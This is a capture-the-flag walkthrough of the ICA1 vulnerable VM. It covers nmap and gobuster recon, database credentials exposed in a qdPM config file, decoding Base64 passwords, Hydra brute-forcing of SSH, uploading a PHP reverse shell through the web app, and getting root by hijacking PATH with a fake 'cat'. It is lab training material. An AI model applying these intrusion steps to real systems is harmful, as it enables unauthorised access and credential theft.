This is a vulnerable virtual machine from a platform called Vulnhub. You can download it. https://www.vulnhub.com/timeline/

https://tryhackme.com/room/ica1

![4ba4d5ae2975c395197374aabef5c0aa.png](resources/4ba4d5ae2975c395197374aabef5c0aa.png)

![c46a9dd5ac4d7ec8493cf250ea01ee45.png](resources/c46a9dd5ac4d7ec8493cf250ea01ee45.png)

Resonances

Find the IP address:

sudo arp-scan --localnet   or sudo netdiscover

![71cf499a5f6df73ca97853693445677d.png](resources/71cf499a5f6df73ca97853693445677d.png)

**Nmap:**

nmap -Pn -p- -sC -sV -vvv &lt; Target IP &gt;

![f02222b92dce39430e5c04140528085b.png](resources/f02222b92dce39430e5c04140528085b.png)

![3ba99523d4c0d3b36ecb456796d1b2bb.png](resources/3ba99523d4c0d3b36ecb456796d1b2bb.png)

The port scan shows that the **SSH, HTTP, and MySQL** services are running. SSH is a fairly new version (current version: **9.4**). We will analyze the web application later.

For now, let's begin by manually enumerating the MySQL service.

nmap -sV -p 3306 --script=mysql-\* &lt; Target IP &gt;

![08aec719beb65ab332a4f299a24471a7.png](resources/08aec719beb65ab332a4f299a24471a7.png)

The service enumeration revealed valuable information. However, the real question was whether those users could log in with an **empty password**. To test this, I attempted to log in using:

`mysql -h <ip> -u <user>`

Unfortunately, the login attempts were unsuccessful.

Since nothing particularly stood out as a useful lead from the MySQL service, I decided to move on and examine the **web application running on port 80**.

![607618de02787c788b4d244312634675.png](resources/607618de02787c788b4d244312634675.png)

qdPM v9.2

I ran **Gobuster** against the base URL using a popular wordlist to discover hidden directories and files.

gobuster dir --url [http://&lt; Target IP &gt;](http://10.0.2.6) -w /usr/share/dirb/wordlists/common.txt![1b515f073d66ba9f29ca439d3ede5931.png](resources/1b515f073d66ba9f29ca439d3ede5931.png)

I spent some time going through the discovered directories looking for potential leads. Eventually, I found the `/core/config` directory, which contained **MySQL database credentials**. These credentials provided the **initial foothold** on the target system.

![e16cf9973f4ac93e08d8e78dbecd1861.png](resources/e16cf9973f4ac93e08d8e78dbecd1861.png)

![8f4849d7803e57e9acf979490011656b.png](resources/8f4849d7803e57e9acf979490011656b.png)

![d4f81050eafcfd83b90e38217a0a4f32.png](resources/d4f81050eafcfd83b90e38217a0a4f32.png)

![30606ef4a8b4613b4c0d7ed86cf0078d.png](resources/30606ef4a8b4613b4c0d7ed86cf0078d.png)

all:  
  doctrine:  
    class: sfDoctrineDatabase  
    param:  
      dsn: 'mysql:dbname=qdpm;host=localhost'  
      profiler: false  
      username: qdpmadmin  
      password: "&lt;?php echo urlencode('UcVQCMQk2STVeS6J') ; ?&gt;"   
      attributes:  
        quote_identifier: true

Also, I did subdirectory enumeration, and I found a config file

gobuster dir --url [http://&lt; Target IP &gt;/core](http://10.0.2.6/core) -w /usr/share/dirb/wordlists/common.txt

![4fbd93c4c9721ee726c427f5320efb3c.png](resources/4fbd93c4c9721ee726c427f5320efb3c.png)

# Initial Foothold

I discovered two possible exploitation paths by leveraging my access to the **MySQL database**:

1.  **SSH credentials** stored in the `staff` database
    
2.  Resetting the password for the **qdPM admin account**, creating a new admin user, and then using the built-in functionality of the **qdPM web application** to obtain a reverse shell as the `www-data` service account
    

## First Way: SSH Credentials

To begin investigating the first path, I connected to the MySQL database using the discovered credentials:

mysql -h &lt;Target IP&gt; -u qdpmadmin -p

![00baec588360ed499fc58158002f70db.png](resources/00baec588360ed499fc58158002f70db.png)

if you get above error try --> mysql -h &lt; Target IP &gt; -u qdpmadmin -p --skip-ssl

![0b43896d1b3d2f5454a607128b1db608.png](resources/0b43896d1b3d2f5454a607128b1db608.png)

show databases;

![6005ed6d703135402c8a3bca86b27eac.png](resources/6005ed6d703135402c8a3bca86b27eac.png)

use staff;

select \* from login

select \* from user;

![e27848e93b143d0fcbf5f7aa3fbd2346.png](resources/e27848e93b143d0fcbf5f7aa3fbd2346.png)

MySQL \[staff\]> select \* from login  
    -> ;  
+------+---------+--------------------------+  
| id | user_id | password |  
+------+---------+--------------------------+  
| 1 | 2 | c3VSSkFkR3dMcDhkeTNyRg== |  
| 2 | 4 | N1p3VjRxdGc0MmNtVVhHWA== |  
| 3 | 1 | WDdNUWtQM1cyOWZld0hkQw== |  
| 4 | 3 | REpjZVZ5OThXMjhZN3dMZw== |  
| 5 | 5 | Y3FObkJXQ0J5UzJEdUpTeQ== |  
+------+---------+--------------------------+  
5 rows in set (0.003 sec)

MySQL \[staff\]> select \* from user;  
+------+---------------+--------+---------------------------+  
| id | department_id | name | role |  
+------+---------------+--------+---------------------------+  
| 1 | 1 | Smith | Cyber Security Specialist |  
| 2 | 2 | Lucas | Computer Engineer |  
| 3 | 1 | Travis | Intelligence Specialist |  
| 4 | 1 | Dexter | Cyber Security Analyst |  
| 5 | 2 | Meyer | Genetic Engineer |  
+------+---------------+--------+---------------------------+

Before continuing, check out all databases and tables.

![283dc872fb6f0236af3b04e6fd83f65b.png](resources/283dc872fb6f0236af3b04e6fd83f65b.png)

In the screenshot above, I identified a database containing **SSH usernames and Base64-encoded passwords**. I copied the usernames and passwords into separate files so they could be used for password cracking with **Hydra**.

nano users.txt

![83bcdc3c9b9f6650fa161ddc42a42f43.png](resources/83bcdc3c9b9f6650fa161ddc42a42f43.png)

nano credentials

![0795a8ac8bff29a1fc162e793d2a73e1.png](resources/0795a8ac8bff29a1fc162e793d2a73e1.png)

![531f61ba6cf7dc79f705dc3bf3341859.png](resources/531f61ba6cf7dc79f705dc3bf3341859.png)

Using **CyberChef**, I was able to decode the hashes. It was fairly easy to determine that the passwords were **Base64-encoded** based on their format

![8c1a335fb422fd45c1d5e53f1e107b70.png](resources/8c1a335fb422fd45c1d5e53f1e107b70.png)

To speed up the process, I wrote a small loop to decode all of them and output the results to a file.

`for i in $(cat credentials); do echo $i > $i.txt; base64 -d $i.txt >> pass.txt; echo >> pass.txt; rm $i.txt; done`

![506e637c60953d861cfe187350c89e1c.png](resources/506e637c60953d861cfe187350c89e1c.png)

From here, I was able to use both the users and password lists to start running a dictionary attack on the running SSH service.

![bad8a56efa640ceeedbf1a40dccb6f21.png](resources/bad8a56efa640ceeedbf1a40dccb6f21.png)

In this case, I could not find any valid passwords, so I added the usernames in lowercase.

hydra -L users.txt -P pass.txt ssh://&lt; Target IP &gt;

![e250da4c26b241d93fbd5dd599b752cc.png](resources/e250da4c26b241d93fbd5dd599b752cc.png)

\[22\]\[ssh\] host: &lt; Target IP &gt; login: travis password: DJceVy98W28Y7wLg  
\[22\]\[ssh\] host: &lt; Target IP &gt; login: dexter password: 7ZwV4qtg42cmUXGX

As shown in the screenshot above, I was able to compromise two different user accounts. I logged into both accounts to inspect their home directories. In **Dexter’s** directory, I found a note referencing another potential vulnerability.

In **Travis’** directory, I located the **user flag**, which is commonly used in simulated environments as proof of low-level access.

ssh dexter@&lt; Target IP &gt;

![c24ab897adc034065f0286b298d7ba82.png](resources/c24ab897adc034065f0286b298d7ba82.png)

![25a034c037fcca50189aa7f818456a01.png](resources/25a034c037fcca50189aa7f818456a01.png)

Let's log in with **Travis**.

ssh travis@&lt; Target IP &gt;

![1c1480448360ea9d40449bcf0c4d2258.png](resources/1c1480448360ea9d40449bcf0c4d2258.png)

ICA{Secret_Project}

## Second Way: Reverse Shell

I found the following values in the `qdPM` database within the `configuration` table:

![f09d3cc342988a7a188587efa6e8acab.png](resources/f09d3cc342988a7a188587efa6e8acab.png)

![e708ef17e11d56405cb891214712047c.png](resources/e708ef17e11d56405cb891214712047c.png)

![58d823492ace11ff9a6908ff024c195d.png](resources/58d823492ace11ff9a6908ff024c195d.png)

The screenshot above shows the **qdPM admin email and password** used to log in to the web application. There was originally a different password stored in the database, but I changed it because I was unable to crack it using any of the wordlists I had.

This can be done by running the following SQL command:

update configuration set value='&lt;New WP-PHP hash&gt;' where id=2;

I generated the new **WP-PHP hash** using an online hash generator.

After updating the admin password, I logged in to the **qdPM web application** with the new credentials and created a new administrator account.

![123452a2675ab1ca2f040f0f6ed54e26.png](resources/123452a2675ab1ca2f040f0f6ed54e26.png)

Using the new admin account `pwned`, I created a new project and uploaded a **PHP reverse shell** in the `attachments` section.

![04c690ef488200f91e6fe4caaff7e217.png](resources/04c690ef488200f91e6fe4caaff7e217.png)
![Screenshot 2026-03-17 130740.png](resources/Screenshot 2026-03-17 130740.png)

With the reverse shell uploaded, navigating to `/uploads/attachments` displays the uploaded file. From there, the reverse shell can be executed by clicking on the attachment.

![2ed1589d4a9eb89d9751019815169554.png](resources/2ed1589d4a9eb89d9751019815169554.png)

![718c1f55d34cd729fbe02443440d62af.png](resources/718c1f55d34cd729fbe02443440d62af.png)

![2f83ce319b2f7e7a4c5755ed80ec9c12.png](resources/2f83ce319b2f7e7a4c5755ed80ec9c12.png)

We can stop this attack route here. Although it is possible to escalate privileges from the `www-data` account to another user, we will continue the privilege escalation section using the user accounts we already have access to.

# Privilege Escalation → PATH Hijacking

Using **Dexter’s SSH credentials**, we find a note he left in `note.txt` that states:

![5bbf53ad09051e7b4c0e025aaa54132a.png](resources/5bbf53ad09051e7b4c0e025aaa54132a.png)

I searched for **SUID binaries** using the command `find / -perm -u+s 2>/dev/null`. This command looks for executables that can be run with **root privileges by a non-root user**.

![a5957629d2c480dd2edcc5797dc68515.png](resources/a5957629d2c480dd2edcc5797dc68515.png)

The first binary in the list appeared to be promising. However, when I attempted to run it, it returned an error.

![1f792bd86e678c7179d29bce58c1c6a6.png](resources/1f792bd86e678c7179d29bce58c1c6a6.png)

Running `strings` on the binary revealed that it calls the `cat` command to display the contents of `system.info`.

To exploit this, I created a malicious `cat` binary in the `/tmp` directory that simply executed `/bin/bash`. I then added `/tmp` to the beginning of the `$PATH` environment variable. When I re-executed the SUID binary, it used my malicious `cat` instead of the system binary, resulting in a **root shell**.

### Creating a Fake `cat`

echo '/bin/bash' > /tmp/cat  
chmod +x /tmp/cat

Now `/tmp/cat` is a script that simply runs:

## Hijacking PATH

export PATH=/tmp:\$PATH --> I changed PATH:

Now PATH looks like: --> /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

So when a program runs `cat`, the system finds:   /tmp/cat

![788f544d03bd52619e7cd8073a248206.png](resources/788f544d03bd52619e7cd8073a248206.png)

![dd171b311cb9f35016d567cbddc3c3cf.png](resources/dd171b311cb9f35016d567cbddc3c3cf.png)

ICA{Next_Generation_Self_Renewable_Genetics}
